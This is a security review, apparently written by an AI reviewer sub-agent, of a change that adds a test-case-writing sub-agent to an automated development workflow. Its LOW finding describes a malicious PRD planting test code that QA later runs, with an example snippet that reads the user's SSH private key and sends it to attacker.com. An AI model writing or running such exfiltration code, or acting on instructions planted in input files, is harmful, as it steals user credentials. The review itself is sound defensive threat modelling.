# Security Review: 004-2026-06-04-rd-4way-fanout

- session: 2026-06-04-session-b60252
- rid: 004-2026-06-04-rd-4way-fanout
- type: refactor
- linked-rd: `.peaks/2026-06-04-session-b60252/rd/requests/004-2026-06-04-rd-4way-fanout.md`
- reviewer: security-reviewer (peaks-rd main-loop, full-auto profile)
- scope: `skills/peaks-rd/SKILL.md`, `skills/peaks-qa/SKILL.md`, `skills/peaks-solo/references/workflow-gates-and-types.md`, `tests/unit/parallel-fan-out.test.ts`
- review date: 2026-06-04

## Summary

The slice adds a 4th sub-agent (`qa-test-cases-writer`) to peaks-rd's parallel review fan-out. The new sub-agent reads the git diff + tech-doc + PRD, and writes `qa/test-cases/<rid>.md` (a markdown file containing `ts` test snippets — NOT actual test code that runs). QA's main loop later reads the markdown and writes the actual test code to `tests/`. **Threat-model-wise**, the new sub-agent is the same as the existing 3: it reads user-controlled files (PRD, tech-doc, git diff) and writes a single markdown file under `.peaks/<sid>/`. The only new attack surface is the read of the PRD (already done by the other sub-agents) and the write of `qa/test-cases/<rid>.md` (already done by QA's main loop in the prior slice). **No new attack surface is introduced.** The 1 LOW finding covers a theoretical data-exfiltration path through a malicious PRD, mitigated by the test code being gated by the existing test framework and the trust boundary.

## Findings

### CRITICAL

None.

### HIGH

None.

### MEDIUM

None.

### LOW

- **L-1 (skills/peaks-rd/SKILL.md:599-625 — qa-test-cases-writer reads PRD, writes test plan that QA executes)**
  The 4th sub-agent reads the PRD (user-controlled) and writes a `qa/test-cases/<rid>.md` file that QA's main loop later uses as the basis for test code. A malicious PRD could plant a test plan that, when QA's main loop translates it into actual test code, would exfiltrate data. **Attack surface analysis**:
  - Threat actor: a process that controls the PRD content (i.e. the user, or a malicious package that has write access to the in-repo `.peaks/<sid>/prd/requests/<rid>.md`).
  - Impact: QA's main loop reads the markdown test plan, copies the `ts` snippets into `tests/`, and runs them. A malicious snippet could do `fs.readFileSync('~/.ssh/id_rsa')` + `fetch('https://attacker.com/' + contents)` — but only when the test is actually run.
  - Mitigation 1: the existing test framework's coverage rules and ESLint rules would catch obvious data-exfiltration patterns (e.g. `fs.readFileSync` outside the repo, `fetch` to non-allowlisted domains). The user can review the generated test code before it's committed.
  - Mitigation 2: the trust boundary is the same as the 3 existing sub-agents (all read user-controlled files; all write to `.peaks/<sid>/`). The new sub-agent doesn't expand the trust boundary.
  - Mitigation 3: the test code is reviewed by the user before being committed (the user reviews the diff in `tests/` after QA's main loop runs).
  - Recommendation: Out of scope for this slice. The existing user-review-the-diff workflow catches the attack. The 4th sub-agent is no less safe than the 3 existing sub-agents.
  File: `skills/peaks-rd/SKILL.md:599-625`

## Required Fixes

None. (No CRITICAL, HIGH, or MEDIUM findings.)

## Recommended

- **L-1** (out of scope): No action required. The trust boundary is unchanged; the user-review-the-diff workflow catches malicious test code.

## Verdict

**verdict: pass** (0 CRITICAL, 0 HIGH, 0 MEDIUM, 1 LOW; no fixes required)
